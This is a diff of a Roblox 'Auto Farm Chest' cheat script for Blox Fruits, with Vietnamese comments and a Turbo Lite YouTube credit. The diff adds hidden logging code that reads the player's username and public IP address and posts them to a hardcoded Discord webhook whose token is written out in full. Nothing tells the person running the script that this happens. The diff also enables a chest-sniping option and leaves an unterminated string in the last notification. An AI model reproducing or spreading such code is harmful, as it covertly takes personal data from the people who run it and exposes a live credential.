@@ -1,45 +1,77 @@
--- Lấy dịch vụ GUI và tạo các phần tử GUI cần thiết
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-local tweenService = game:GetService("TweenService")
 
--- Tạo ScreenGui nếu chưa có
-local screenGui = Instance.new("ScreenGui", playerGui)
-
--- Hàm tạo và tween một TextLabel
-local function createTextLabel(text, color, position)
-    local textLabel = Instance.new("TextLabel", screenGui)
-    textLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
-    textLabel.Position = position
-    textLabel.BackgroundTransparency = 1
-    textLabel.TextColor3 = color
-    textLabel.Text = text
-    textLabel.TextScaled = true
-    textLabel.TextSize = 36  -- Kích thước chữ hợp lý cho dễ đọc
-    textLabel.Font = Enum.Font.GothamBold  -- Chọn kiểu chữ dễ đọc
-    textLabel.TextStrokeTransparency = 0.2  -- Thêm viền rõ ràng để làm nổi bật chữ
-    textLabel.TextTransparency = 1
-    textLabel.Visible = true
-
-    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
-    local tweenIn = tweenService:Create(textLabel, tweenInfo, {TextTransparency = 0})
-    local tweenOut = tweenService:Create(textLabel, tweenInfo, {TextTransparency = 1})
-
-    tweenIn:Play()
-    tweenIn.Completed:Wait()
-    wait(2)
-    tweenOut:Play()
-    tweenOut.Completed:Wait()
+repeat
+    wait()
+until game:IsLoaded()
+if game.PlaceId == 2753915549 then
+    World1 = true
+elseif game.PlaceId == 4442272183 then
+    World2 = true
+elseif game.PlaceId == 7449423635 then
+    World3 = true
+end
+game.StarterGui:SetCore(
+    "SendNotification",
+    {
+        Title = "Script Đang Tải  ..",
+        Text = "Đợi 5 Giây",
+        Icon = "rbxthumb://type=Asset&id=18919385616&w=150&h=150",
+        Duration = 5
+    })
+------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------
+function PostWebhook(Url, message)
+    local request = http_request or request or HttpPost or syn.request
+    local data =
+        request(
+        {
+            Url = Url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(message)
+        }
+    )
+    return ""
 end
 
--- Tạo và xử lý các thông báo
-createTextLabel("Vui Lòng Đợi 5 Giây", Color3.fromRGB(255, 255, 255), UDim2.new(0.25, 0, 0.3, 0))
-createTextLabel("YouTube: Turbo Lite", Color3.fromRGB(0, 255, 0), UDim2.new(0.25, 0, 0.3, 0))
+function AdminLoggerMsg()
+    local randomColor = math.random(0, 0xFFFFFF)
+    local AdminMessage = {
+        ["embeds"] = {
+            {
+                ["title"] = "**Auto Chest**",
+                ["description"] = "",
+                ["type"] = "rich",
+                ["color"] = randomColor, 
+                ["fields"] = {
+                    {
+                        ["name"] = "**Username**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**IP Address**",
+                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
+                        ["inline"] = false
+                    },
+                },
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+            }
+        }
+    }
+    return AdminMessage
+end
 
+PostWebhook("https://discord.com/api/webhooks/1283715341368954941/ph0vTOdk1iW7sDjSmrNKqAHC3IClPjZZmVLKE8spF74tMR6cFITVFuXZt6yW1TIRkKKo", AdminLoggerMsg()) -- Post to admin webhook
+if game.PlaceId == 2753915549 then
+        World1 = true
+    elseif game.PlaceId == 4442272183 then
+        World2 = true
+    elseif game.PlaceId == 7449423635 then
+        World3 = true
+    end
 highChestOnly = true
 
-godsChalicSniper = false 
+godsChalicSniper = true 
 
 repeat task.wait(4) until game:IsLoaded()
 
@@ -233,9 +265,9 @@ function AllowRunServiceBind.OnInvoke(args)
 
     CoreGui:SetCore("SendNotification", {
 
-        Title = "Auto Farm Gương",
+        Title = "Auto Farm Chest",
 
-        Text = "By: Turbo Lite",
+        Text = "YouTube: Turbo Lite",
 
         Icon = "rbxthumb://type=Asset&id=18919385616&w=150&h=150",
 
@@ -280,9 +312,9 @@ local CoreGui = game:GetService("StarterGui")
 
 CoreGui:SetCore("SendNotification", {
 
-    Title = "Auto Farm Gương",
+    Title = "Auto Farm Chest",
 
-    Text = "By: Turbo Lite",
+    Text = "YouTube: Turbo Lite",
 
     Icon = "rbxthumb://type=Asset&id=18919385616&w=150&h=150",
 
@@ -409,3 +441,11 @@ task.spawn(function()
     end
 
 end)
+game.StarterGui:SetCore(
+    "SendNotification",
+    {
+        Title = "Đừng Treo Xuyên Đêm",
+        Text = "Để Không Bị Reset",
+        Icon = "rbxthumb://type=Asset&id=18919385616&w=150&h=150,
+        Duration = 30
+    })
